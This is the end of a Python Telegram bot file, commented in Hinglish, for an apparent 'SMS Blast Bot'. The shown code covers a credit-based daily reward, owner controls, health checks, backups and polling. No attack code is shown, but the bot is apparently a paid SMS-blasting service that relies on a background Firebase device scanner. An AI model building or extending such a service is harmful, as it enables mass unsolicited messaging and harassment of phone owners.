        if now - int((dr.get("last_give") or {}).get(str(uid), 0)) < DAILY_REWARD_HOURS * 3600:
            _dr_cache_refresh(d)  # concurrent grant already ho chuka
            return
        u = d["users"].get(str(uid))
        if u is None:
            reg_user(uid, msg.from_user.full_name or "User", d)
            u = d["users"][str(uid)]
        u["credits"] = int(u.get("credits") or 0) + amount
        dr.setdefault("last_give", {})[str(uid)] = now
        d["daily_reward"] = dr
        try:
            log_activity(d, "daily_reward", uid, f"+{amount} credits (auto)")
        except Exception:
            pass
        save(d)
        _dr_cache_refresh(d)
        _dr_fallback = (
            f"🎁 <b>Daily Reward</b>\n\n"
            f"💰 <b>Your credit increased!</b> <b>+{amount}</b>\n"
            f"🏦 <b>New Balance:</b> {u['credits']} credits\n\n"
            f"⏰ <i>Agla reward 24 ghante baad — aapka pehla message hi kaafi hai.</i>"
        )
        _dr_blocks = [
            rb_heading("🎁 Daily Reward", 2),
            rb_para(f"💰 Your credit increased! +{amount}"),
            rb_para(f"🏦 New Balance: {u['credits']} credits"),
            rb_divider(),
            rb_quote("Agla reward 24 ghante baad — aapka pehla message hi kaafi hai.", credit="⏰"),
        ]
        await send_rich_or_fallback(msg.bot, msg.chat.id, _dr_blocks, _dr_fallback)
    except Exception as e:
        log.error(f"[DAILY-REWARD] grant error: {e}")


class DailyRewardMiddleware(BaseMiddleware):
    """Saare private messages se pehle chalta hai (handler ko block nahi karta)."""
    async def __call__(self, handler, event: Message, data: dict):
        try:
            if (event.chat and event.chat.type == "private"
                    and event.from_user and not event.from_user.is_bot):
                await _daily_reward_check(event)
        except Exception as e:
            log.error(f"[DAILY-REWARD] middleware error: {e}")
        return await handler(event, data)


# ── 🎁 DAILY REWARD OWNER HANDLERS ─────────────────────────────────────────
def _dr_panel_text(d: dict) -> str:
    dr = d.get("daily_reward") or {}
    status = "🟢 <b>ON</b>" if dr.get("enabled") else "🔴 <b>OFF</b>"
    amount = dr.get("amount", 0)
    return (
        f"🎁 <b>Daily Reward (Auto)</b>\n\n"
        f"Status: {status}\n"
        f"💰 Amount: <b>{amount}</b> credits / 24h\n\n"
        "Har user ka 24h ke beech <b>pehla message</b> aane par bot automatic\n"
        "credits de deta hai + <i>\"Your credit increased\"</i> msg bhejta hai.\n"
        "<b>New users</b> ko /start hote hi pehla reward mil jata hai."
    )


@R.callback_query(F.data == "owner:daily_reward")
async def owner_daily_reward(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq)
    await state.clear()
    dr = d.get("daily_reward") or {}
    toggle_txt = "🔘 Turn OFF" if dr.get("enabled") else "🔘 Turn ON"
    await cq.message.edit_text(
        _dr_panel_text(d),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=toggle_txt, callback_data="dr:toggle")],
            [InlineKeyboardButton(text="💰 Set Amount", callback_data="dr:set")],
            [InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="owner:home")]
        ]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "dr:toggle")
async def dr_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq)
    await state.clear()
    dr = d.get("daily_reward") or {"enabled": False, "amount": 10, "last_give": {}}
    dr["enabled"] = not dr.get("enabled")
    d["daily_reward"] = dr
    save(d)
    _dr_cache_refresh(d)
    log_activity(d, "daily_reward_toggle", cq.from_user.id, "ON" if dr["enabled"] else "OFF")
    toggle_txt = "🔘 Turn OFF" if dr["enabled"] else "🔘 Turn ON"
    await cq.message.edit_text(
        _dr_panel_text(d) + f"\n\n✅ <b>{'Enable' if dr['enabled'] else 'Disable'} kar diya!</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=toggle_txt, callback_data="dr:toggle")],
            [InlineKeyboardButton(text="💰 Set Amount", callback_data="dr:set")],
            [InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="owner:home")]
        ]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "dr:set")
async def dr_set_amount(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq)
    await state.set_state(S.daily_reward_amount)
    await cq.message.edit_text(
        "💰 <b>Set Daily Reward Amount</b>\n\n"
        "24h ke liye kitne credits do? <b>Number</b> bhejo (1 se 100000).",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.daily_reward_amount, F.text)
async def dr_set_amount_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    txt = (msg.text or "").strip()
    try:
        amount = int(txt)
    except Exception:
        await msg.answer("❌ Number bhejo (1 se 100000). Dobara try karo:")
        return
    if amount < 1 or amount > 100000:
        await msg.answer("❌ 1 se 100000 ke beech mein amount rakho. Dobara try karo:")
        return
    dr = d.get("daily_reward") or {"enabled": False, "amount": 10, "last_give": {}}
    dr["amount"] = amount
    d["daily_reward"] = dr
    save(d)
    _dr_cache_refresh(d)
    log_activity(d, "daily_reward_amount", msg.from_user.id, str(amount))
    await state.clear()
    toggle_txt = "🔘 Turn OFF" if dr.get("enabled") else "🔘 Turn ON"
    await msg.answer(
        _dr_panel_text(d) + f"\n\n✅ <b>Amount update ho gaya: {amount} credits/24h</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=toggle_txt, callback_data="dr:toggle")],
            [InlineKeyboardButton(text="💰 Set Amount", callback_data="dr:set")],
            [InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="owner:home")]
        ]),
        parse_mode="HTML"
    )


async def _render_health_server():
    """Render Web Service ka health check ke liye chhota HTTP server (PORT env se).
    Background Worker use karte ho toh PORT nahi hota — 8080 pe chalta hai, nuksan nahi."""
    try:
        from aiohttp import web as _aiohttp_web
        port = int(os.environ.get("PORT", "8080"))
        async def _health(request):
            return _aiohttp_web.Response(text="ok")
        app = _aiohttp_web.Application()
        app.router.add_get("/", _health)
        app.router.add_get("/health", _health)
        runner = _aiohttp_web.AppRunner(app)
        await runner.setup()
        site = _aiohttp_web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
        log.info(f"[HEALTH] Health server :{port} par sun raha hai (Render health check)")
    except Exception as e:
        log.warning(f"[HEALTH] Health server start fail (Background Worker pe normal hai): {e}")


def _hydrate_scan_state() -> bool:
    """DB mein saved scan state (24h ke andar) se CACHED_DEVICES/FB_DEVICE_COUNTS bharo.
    Return True agar hydration hui (scanner ab 24h window tak scan skip karega)."""
    global CACHED_DEVICES, LAST_SCAN_TIME, SCAN_STATUS
    try:
        _ls = load().get("last_scan") or {}
        if _ls.get("ts") and (time.time() - int(_ls["ts"])) < _BACKGROUND_SCAN_INTERVAL:
            CACHED_DEVICES = _ls.get("devices", []) or []
            LAST_SCAN_TIME = float(_ls["ts"])
            for _fk, _fv in (_ls.get("fb_counts") or {}).items():
                FB_DEVICE_COUNTS[_fk] = _fv
            SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(CACHED_DEVICES)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | asᴛ: {fmt_time(int(LAST_SCAN_TIME))}"
            log.info(f"[START] Scan state DB se hydrated — 24h ke andar scan skip ({len(CACHED_DEVICES)} cached devices)")
            return True
    except Exception as e:
        log.warning(f"[START] Scan state hydrate fail: {e}")
    return False


@R.message()
async def catchall_welcome(msg: Message, state: FSMContext):
    """CATCH-ALL (sabse aakhri message handler): koi bhi message — text/photo/video/sticker/voice —
    agar kisi specific handler se nahi mila aur user kisi flow mein nahi hai,
    toh /start wala welcome flow chalao (animation → video → animated panel)."""
    try:
        if msg.from_user is None or msg.from_user.is_bot:
            return
        if await state.get_state() is not None:
            return  # flow beech mein — state handler sambhalta hai
    except Exception:
        return
    await _welcome(msg, state)

# ════════════ BOT TOKEN RESOLUTION: env > DB (panel set) > code constant ════════════
TOKEN_RE = re.compile(r"^\d{8,12}:[A-Za-z0-9_-]{35}$")

def resolve_bot_token() -> tuple:
    """Token priority: (1) env BOT_TOKEN  (2) DB 'bot_token' (owner panel se set)
    (3) code mein hardcoded fallback. Returns (token, source_label)."""
    env_tok = (os.getenv("BOT_TOKEN") or "").strip()
    if env_tok:
        return env_tok, "env (BOT_TOKEN)"
    try:
        _d = load()
        db_tok = str(_d.get("bot_token") or "").strip()
        if db_tok:
            if TOKEN_RE.match(db_tok):
                return db_tok, "DB (owner panel set)"
            log.warning(f"[TOKEN] DB token format invalid — {db_tok[:6]}...{db_tok[-4:]} — env/code fallback")
    except Exception as e:
        log.warning(f"[TOKEN] DB token read fail (env/code fallback): {e}")
    return BOT_TOKEN, "code (hardcoded fallback)"

async def main():
    t_boot = time.time()
    log.info("[START] ⏳ Boot shuru — health port + auto-restore start ho raha hai...")
    # Pehle persistent storage detect (Render disk /var/data) — restore se pehle
    persist_dir = _ensure_persistent_storage()
    _tok, _tok_src = resolve_bot_token()
    log.info(f"[START] Bot token source: {_tok_src}")
    bot = Bot(token=_tok)
    # Render health check: PORT abhi (restore se PEHLE) bind karo — taaki
    # "service is live" turant aaye + port-timeout kill na ho; restore/backup ke
    # dauran bhi health endpoint 200 deta rahta hai
    asyncio.create_task(_render_health_server())
    # Startup: agar DB corrupt/missing ho toh auto-restore (local → firebase → channel)
    # ⚠️ restore ke dauran save() hook ko Firebase push se rok do (fresh-DB-overwrite race)
    _RESTORE_IN_PROGRESS[0] = True
    t_restore = time.time()
    try:
        restore_status = await auto_restore_db_if_needed(bot)
    finally:
        _RESTORE_IN_PROGRESS[0] = False
    log.info(f"[START] Restore step: {time.time() - t_restore:.1f}s — {restore_status}")
    if restore_status.startswith("restored:"):
        log.info(f"[START] Auto-restore ho gaya: {restore_status}")
        # Restore ho chuka — Firebase ko CURRENT (restored) data se re-sync karo,
        # taaki latest node hamesha current state rakhe
        try:
            _LAST_FB_BACKUP_TS[0] = time.time()
            asyncio.get_running_loop().create_task(fb_cloud_backup(load()))
        except Exception as e:
            log.warning(f"[START] Post-restore Firebase re-push skip: {e}")
    elif restore_status == "no_backup":
        log.info("[START] Koi backup nahi mila — fresh start")

    # Firebase mode: purani local backup files disk se saaf karo (Render free tier 256MB disk —
    # 23MB+ DB ke 7 .json backups = 160MB+ = storage-limit warning/kill). Ab naye local backups
    # bhi nahi banenge (make_local_backup guard) — sab storage Firebase mein.
    _d0 = None
    try:
        _d0 = load()
        _cleanup_local_backups_if_fb(_d0)
    except Exception as e:
        log.warning(f"[START] Local backup cleanup skip: {e}")

    # Startup par ek fresh local backup bhi bana lo (sirf non-Firebase mode mein) — taaki pehla
    # hourly tick se pehle VPS band ho jaye toh bhi restore point exist kare
    _startup_backup = make_local_backup(_d0)
    if _startup_backup:
        log.info(f"[START] Startup local backup: {_startup_backup}")

    # Daily reward cache DB se hydrate (middleware ab in-memory check karta hai — CPU save)
    try:
        _dr_cache_refresh()
    except Exception:
        pass
    # Scan state hydrate — 24h ke andar hui scan ka result DB se lo, taaki
    # restart/redeploy pe poora scan DOBARA na chale (VPS CPU/IO save)
    _hydrate_scan_state()

    dp = Dispatcher(storage=MemoryStorage())
    dp.message.middleware(DailyRewardMiddleware())
    dp.include_router(R)

    @dp.errors()
    async def _global_error_handler(event: ErrorEvent):
        exc = event.exception
        msg = str(exc)
        if isinstance(exc, TelegramBadRequest) and (
            "query is too old" in msg.lower() or "query id is invalid" in msg.lower()
        ):
            log.info(f"[SAFE] Stale callback query ignore kiya: {msg[:120]}")
            return
        if isinstance(exc, TelegramForbiddenError):
            # User ne Telegram pe bot BLOCK kar rakha hai — unse message nahi ja sakta.
            # Ye code ka error nahi, user ka apna action hai — quiet log sirf.
            log.info(f"[SAFE] User ne bot block kar rakha hai — message skip: {msg[:100]}")
            return
        log.error(f"Handler error: {type(exc).__name__}: {msg[:300]}", exc_info=exc)

    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    backup_task = asyncio.create_task(background_backup_sender(bot))
    autobc_task = asyncio.create_task(auto_broadcast_loop(bot))
    weekly_task = asyncio.create_task(weekly_broadcast_loop(bot))
    log.info("Background scanner & backup tasks created (+weekly broadcast loop)")

    if restore_status == "ok":
        restore_line = "✅ OK (main DB latest — import ki zaroorat nahi thi)"
    elif restore_status.startswith("restored:"):
        restore_line = f"♻️ AUTO-IMPORT HO GAYA (recent backup: {restore_status.split(':',1)[1]})"
    elif restore_status == "no_backup":
        restore_line = "🆕 Fresh start (koi recent backup nahi mila) — channel ka latest backup import karo"
    else:
        restore_line = "⚠️ Import failed — fresh start"

    if persist_dir:
        persist_line = f"✅ PERSISTENT ({persist_dir}) — restart/redeploy pe data safe"
    else:
        persist_line = "⚠️ TEMPORARY — Render pe Persistent Disk attach karo (/var/data), data hamesha safe rahega"

    try:
        _fbu = get_backup_fb_url()
    except Exception:
        _fbu = ""
    fb_line = f"✅ <code>{_fbu.split('//', 1)[-1]}</code>" if _fbu else "❌ not set (owner panel → backup firebase)"
    try:
        _dr = load().get("daily_reward") or {}
        dr_line = f"✅ ON (<b>{_dr.get('amount', 0)}</b> credits/24h)" if _dr.get("enabled") else "❌ OFF (owner panel → daily reward)"
    except Exception:
        dr_line = "❌ OFF"

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{now_ist().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"{em(EMOJI_GEAR, '🔄')} <b>Background Scanner:</b> Starting...\n"
            f"📦 <b>Auto Database Backup:</b> Every 1 Hour -> Log Channel\n"
            f"🗄 <b>DB Status:</b> {restore_line}\n"
            f"💾 <b>Storage:</b> {persist_line}\n"
            f"📦 <b>FB Cloud Backup:</b> {fb_line}\n"
            f"🎁 <b>Daily Reward:</b> {dr_line}\n"
            f"{em(EMOJI_WARNING, '⏱')} Auto-Scan Interval: <b>24 hours (1 din mein 1 baar)</b>\n"
            f"{em(EMOJI_STAR, '👥')} <b>Per-User Sessions:</b> ENABLED\n"
            f"{em(EMOJI_ROCKET, '🚀')} <b>Concurrent Users:</b> 1000+\n"
            f"{em(EMOJI_LOCK, '🔒')} <b>Number Protection:</b> ENABLED\n"
            f"{em(EMOJI_VIDEO, '📹')} <b>Video Section & Auto-Send:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits All:</b> ENABLED (With Yes/No & Protection)\n"
            f"👤 <b>Bot Owner:</b> {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    log.info(f"[START] ✅ Bot live — total boot time {time.time() - t_boot:.1f}s (restore+setup done, ab messages ka reply shuru)")
    log.info("Polling start ho raha hai... (NOTE: isi token se sirf EK instance chale, warna 409 conflict)")
    # SAFETY: agar kisi external app/purani try ne bot pe WEBHOOK set kar diya hai,
    # tab polling (getUpdates) "Conflict: webhook is active" se fail ho jaata hai.
    # Har boot pe pehle purana webhook delete → clean polling (drop_pending_updates=False
    # = pending updates nahi girenge).
    try:
        await bot.delete_webhook(drop_pending_updates=False)
        log.info("[START] Webhook clear — bot ab pure POLLING mode mein hai (koi webhook conflict nahi)")
    except Exception as e:
        log.warning(f"[START] delete_webhook skip/failed: {e}")
    while True:
        try:
            await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
            break  # clean stop (manual shutdown)
        except TelegramConflictError as ce:
            ce_str = str(ce)
            if "webhook" in ce_str.lower():
                # Webhook active hai (do instances nahi) — retry mat karo, sahi message do
                log.error("WEBHOOK CONFLICT: bot pe koi webhook active hai — polling block hai!")
                try:
                    await bot.send_message(
                        MAIN_OWNER,
                        ("⚠️ <b>Webhook Conflict!</b>\n\n"
                         "Bot pe koi purana WEBHOOK active hai — isliye polling fail ho rahi hai.\n"
                         "Naya code har boot pe webhook khud delete karta hai: is file se <b>dobara deploy</b> karo\n"
                         "(ya ek baar BotFather se /setwebhook → Delete Webhook chala lo)."),
                        parse_mode="HTML"
                    )
                except Exception as e:
                    log.warning(f"Webhook-conflict owner notify failed: {e}")
                await bot.session.close()
                os._exit(1)
            # Do instances ek hi token se chal rahe hain (classic 409)
            log.error("409 CONFLICT: isi token se pehle se ek aur bot instance chal raha hai!")
            try:
                await bot.send_message(
                    MAIN_OWNER,
                    ("⚠️ <b>409 Conflict — Bot do baar start hua hai!</b>\n\n"
                     "Isi token se ek aur process pehle se chal raha hai.\n"
                     "Purana process band karo (e.g. <code>kill</code> ya VPS pe puma/systemd service stop),\n"
                     "phir sirf <b>EK</b> instance start karo."),
                    parse_mode="HTML"
                )
            except Exception as e:
                log.warning(f"Conflict owner notify failed: {e}")
            await bot.session.close()
            os._exit(1)
        except Exception as e:
            # Transient polling error (network blip / 429 / timeout) — process EXIT mat karo,
            # 10s baad auto-retry karo (pehle ye error pe process band → Render "har bar" restart karta tha)
            log.error(f"Polling error: {str(e)[:300]} — 10s baad auto-retry (process band nahi hoga)")
            try:
                await bot.send_message(
                    MAIN_OWNER,
                    f"⚠️ <b>Bot recovery:</b> polling error mila, 10s baad khud retry kar raha hai...\n<code>{str(e)[:200]}</code>",
                    parse_mode="HTML"
                )
            except Exception:
                pass
            await asyncio.sleep(10)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Bot stopped by user")
    except Exception as e:
        log.error(f"Bot crashed: {type(e).__name__}: {e}")
        raise
